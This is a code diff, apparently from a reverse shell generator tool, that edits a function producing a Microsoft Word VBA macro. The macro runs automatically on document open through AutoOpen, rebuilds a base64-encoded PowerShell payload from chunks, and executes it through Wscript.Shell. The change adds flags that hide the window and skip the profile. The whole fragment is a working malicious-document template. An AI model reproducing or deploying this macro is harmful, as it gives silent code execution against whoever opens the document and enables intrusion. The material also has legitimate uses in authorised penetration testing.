@@ -226,7 +226,7 @@ const rsg = {
 
         const chunks = base64.match(/.{1,255}/g) || [];
 
-        const macroLines = chunks.map((chunk, index) => `    str = str + "${chunk}"`);
+        const macroLines = chunks.map((chunk, index) => `    Str = Str + "${chunk}"`);
         const macro = [
             'Sub AutoOpen()',
             '    MyMacro',
@@ -237,9 +237,9 @@ const rsg = {
             'End Sub',
             '',
             'Sub MyMacro()',
-            '    Dim str As String',
+            '    Dim Str As String',
             ...macroLines,
-            '    CreateObject("Wscript.Shell").Run "powershell -e " & str, 0',
+            '    CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -enc " & Str, 0',
             'End Sub'
         ].join('\n');
 
